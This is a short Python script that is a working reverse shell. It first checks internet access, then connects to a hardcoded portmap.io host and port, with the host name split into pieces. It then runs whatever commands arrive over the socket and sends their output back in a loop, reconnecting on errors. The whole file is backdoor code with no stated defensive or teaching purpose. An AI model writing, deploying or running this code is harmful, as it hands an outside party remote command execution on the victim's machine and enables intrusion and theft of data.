import socket
import os
import time
import subprocess
def isComputerOnline():
	host = "www.google.com"
	port = 80 
	while True:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((host,port))
			return True
		except:
			return False
def LowSystemAccess():
	host= "pramoth-"+"41592."+"portmap.io"
	port = 60067
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	time.sleep(1)
	while True:
		try:
			cmd = s.recv(2048).decode()
			if cmd.lower().strip()=="exit":
				s.close()
				break
			OutPut = subprocess.getoutput(cmd)
			Cons = " Prompt > " + OutPut
			s.send(Cons.encode())
		except:
			LowSystemAccess()
def Control():
	if isComputerOnline():
		LowSystemAccess()
Control()